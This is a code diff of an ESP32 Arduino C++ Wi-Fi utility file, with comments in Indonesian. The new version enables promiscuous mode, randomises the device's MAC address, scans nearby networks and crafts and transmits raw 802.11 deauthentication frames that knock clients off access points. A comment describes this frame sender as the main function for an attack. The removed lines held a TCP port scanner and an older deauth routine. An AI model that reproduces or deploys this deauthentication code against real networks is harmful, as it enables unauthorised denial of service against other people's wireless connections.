@@ -1,152 +1,110 @@
 // wifi_utils.cpp
-#include "wifi_utils.h"
 
-WiFi_Utils::WiFi_Utils(bool random_mac) : random_mac_enable(random_mac)
-{
+#include "wifi_utils.h"
+#include "esp_system.h"
+// Fungsi random() sudah built-in di Arduino, tidak perlu include "random.h"
+
+// Konstruktor
+WiFi_Utils::WiFi_Utils(bool random_mac) {
+  random_mac_enable = random_mac;
 }
 
-bool WiFi_Utils::init()
-{
-  if (random_mac_enable)
-  {
-    isInit = changeMACAddress();
+// Inisialisasi Wi-Fi dalam mode yang dibutuhkan untuk serangan
+bool WiFi_Utils::init() {
+  // --- PERBAIKAN 1: Gunakan WIFI_MODE_APSTA ---
+  WiFi.mode(WIFI_MODE_APSTA); 
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // Set ke channel awal
+  
+  if (random_mac_enable) {
+    changeMACAddress();
   }
-  else
-  {
-    isInit = true;
-  }
+
+  mac_address = macAddress();
+  
+  // --- PERBAIKAN 2: Pisahkan Serial.println untuk std::string ---
+  Serial.print("Wi-Fi Utils Initialized. MAC Address: ");
+  Serial.println(mac_address.c_str());
+  
+  isInit = true;
   return isInit;
 }
 
-bool WiFi_Utils::changeMACAddress()
-{
-  uint8_t mac[6];
-  randomSeed(analogRead(0));
-  for (int i = 0; i < 6; i++)
-  {
-    mac[i] = random(0, 256);
+// Scan jaringan Wi-Fi dan simpan dalam struktur data
+wifiData WiFi_Utils::scanWifiList() {
+  Serial.println("\n[INFO] Scanning networks...");
+  wifi_list.ssid.clear();
+  wifi_list.bssid.clear();
+  wifi_list.channel.clear();
+  wifi_list.signal.clear();
+
+  int n = WiFi.scanNetworks(false, true, false, 300); // Async, show_hidden, passive, channel_time_ms
+  Serial.println("[INFO] Scan complete.");
+  if (n == 0) {
+    Serial.println("[INFO] No networks found");
+  } else {
+    Serial.print((String)n + " networks found\n");
+    for (int i = 0; i < n; ++i) {
+      wifi_list.ssid.push_back(WiFi.SSID(i).c_str());
+      wifi_list.bssid.push_back(WiFi.BSSIDstr(i).c_str());
+      wifi_list.channel.push_back(WiFi.channel(i));
+      wifi_list.signal.push_back(WiFi.RSSI(i));
+    }
   }
+  WiFi.scanDelete(); // Hapus hasil scan dari memori
+  wifi_list.num = n;
+  return wifi_list;
+}
 
-  mac[0] = (mac[0] & 0xFC) | 0x02;
+// Fungsi untuk mengubah alamat MAC
+bool WiFi_Utils::changeMACAddress() {
+  uint8_t new_mac[6];
+  // Generate 3 byte acak untuk OUI (Organizationally Unique Identifier)
+  // dan 3 byte acak untuk NIC (Network Interface Controller)
+  for (int i = 0; i < 6; i++) {
+    new_mac[i] = random(256); // Fungsi random() ini sudah built-in
+  }
+  // Set bit lokal dan unicast
+  new_mac[0] |= 0x02; 
+  new_mac[0] &= ~0x01;
 
-  WiFi.mode(WIFI_STA);
-
-  if (esp_wifi_set_mac(WIFI_IF_STA, mac) == ESP_OK)
-  {
-    mac_address = WiFi.macAddress().c_str();
+  esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, new_mac);
+  if (err == ESP_OK) {
+    Serial.println("[INFO] MAC Address changed successfully.");
     return true;
-  }
-  else
-  {
+  } else {
+    Serial.println("[ERROR] Failed to change MAC Address.");
     return false;
   }
 }
 
-wifiData WiFi_Utils::scanWifiList()
-{
-  wifiData wifi_;
-  WiFi.mode(WIFI_STA);
-  int numWifi = WiFi.scanNetworks();
-  wifi_.num = numWifi;
-  if (numWifi == 0)
-  {
-    return wifi_;
-  }
-  else
-  {
-    for (int i = 0; i < numWifi; i++)
-    {
-      wifi_.ssid.push_back(std::string(WiFi.SSID(i).c_str()));
-      wifi_.bssid.push_back(std::string(WiFi.BSSIDstr(i).c_str()));
-      wifi_.channel.push_back(WiFi.channel(i));
-      wifi_.signal.push_back(WiFi.RSSI(i));
-    }
-    return wifi_;
-  }
+// Fungsi UTAMA: Mengirimkan paket Deauthentication
+void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_mac) {
+  // Struktur paket deauth
+  // https://mrncciew.com/2014/10/08/802-11-mgmt-deauthentication-frame/
+  uint8_t packet[26] = {
+    /*  0 - 1  */ 0xC0, 0x00,                         // Frame Control
+    /*  2 - 3  */ 0x00, 0x00,                         // Duration
+    /*  4 - 9  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (client_mac)
+    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (bssid)
+    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (bssid)
+    /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
+    /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
+  };
+
+  // Salin MAC address ke dalam paket
+  memcpy(&packet[4], client_mac, 6);  // Tujuan adalah klien
+  memcpy(&packet[10], bssid, 6);      // Sumber adalah AP
+  memcpy(&packet[16], bssid, 6);      // BSSID adalah AP
+
+  // Kirim paket menggunakan fungsi level rendah ESP-IDF
+  // esp_wifi_80211_tx(interface, buffer, panjang, tidak di-enqueue)
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  
+  delay(1); // Beri jeda singkat agar tidak membebani buffer
 }
 
-bool WiFi_Utils::connectToWifi(std::string SSID, std::string PASSWORD, std::string HOSTNAME, const int MAX_ATTEMPTS,
-                               const int TRIAL_DELAY)
-{
-  WiFi.mode(WIFI_STA);
-  WiFi.config(INADDR_NONE, INADDR_NONE, INADDR_NONE, INADDR_NONE);
-  WiFi.setHostname(HOSTNAME.c_str());
-  WiFi.begin(SSID.c_str(), PASSWORD.c_str());
-
-  int attempts = 0;
-  while (WiFi.status() != WL_CONNECTED && attempts < MAX_ATTEMPTS)
-  {
-    delay(TRIAL_DELAY);
-    attempts++;
-  }
-
-  if (WiFi.status() == WL_CONNECTED)
-  {
-    return true;
-  }
-  else
-  {
-    return false;
-  }
-  return false;
-}
-
-bool WiFi_Utils::scanSinglePort(IPAddress ip, int port, int timeout_ms)
-{
-  WiFiClient client;
-  client.setTimeout(timeout_ms);
-  if (client.connect(ip, port))
-  {
-    client.stop();
-    return true;
-  }
-  return false;
-}
-
-std::vector<int> WiFi_Utils::scanPortsInRange(IPAddress ip, int startPort, int endPort, int timeout_ms)
-{
-  std::vector<int> openPorts;
-
-  for (int port = startPort; port <= endPort; ++port)
-  {
-    if (scanSinglePort(ip, port, timeout_ms))
-    {
-      openPorts.push_back(port);
-    }
-    delay(50);
-  }
-  return openPorts;
-}
-
-void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta)
-{
-  struct
-  {
-    uint8_t frame_control[2];
-    uint8_t duration[2];
-    uint8_t addr1[6];
-    uint8_t addr2[6];
-    uint8_t addr3[6];
-    uint8_t sequence_control[2];
-    uint8_t reason_code[2];
-  } __attribute__((packed)) deauth_frame;
-
-  deauth_frame.frame_control[0] = 0xC0;  // To DS + From DS + Deauth Frame
-  deauth_frame.frame_control[1] = 0x00;
-  deauth_frame.duration[0] = 0x00;
-  deauth_frame.duration[1] = 0x00;
-  memcpy(deauth_frame.addr1, sta, 6);    // STA address
-  memcpy(deauth_frame.addr2, bssid, 6);  // AP address
-  memcpy(deauth_frame.addr3, bssid, 6);  // AP address
-  deauth_frame.sequence_control[0] = 0x00;
-  deauth_frame.sequence_control[1] = 0x00;
-  deauth_frame.reason_code[0] = 0x01;  // Reason: Unspecified reason
-  deauth_frame.reason_code[1] = 0x00;
-
-  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
-}
-
-std::string WiFi_Utils::macAddress()
-{
-  return mac_address;
+// Dapatkan MAC address saat ini
+std::string WiFi_Utils::macAddress() {
+  return WiFi.macAddress().c_str();
 }
